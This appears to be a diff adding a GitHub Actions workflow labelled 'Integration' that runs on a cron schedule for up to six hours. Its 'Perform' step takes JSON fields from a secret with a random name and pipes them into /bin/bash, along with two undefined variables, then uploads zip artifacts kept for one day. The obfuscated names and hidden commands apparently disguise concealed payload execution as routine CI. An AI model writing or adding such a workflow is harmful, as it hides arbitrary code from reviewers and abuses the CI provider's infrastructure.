@@ -1,0 +1,33 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '50 4,10,16,22 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          cyl633: ${{ secrets.cyl633 }}
+        run: |
+          printf '%s' "$cyl633" | jq -r .alss805 | /bin/bash
+          echo $qtm50402 | jq -r .nn8335 | /bin/bash
+          printf '%s' "$afsg987" | jq -r .qujaq80737 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: LVOpBzx7
+          path: "*.zip"
+          retention-days: 1
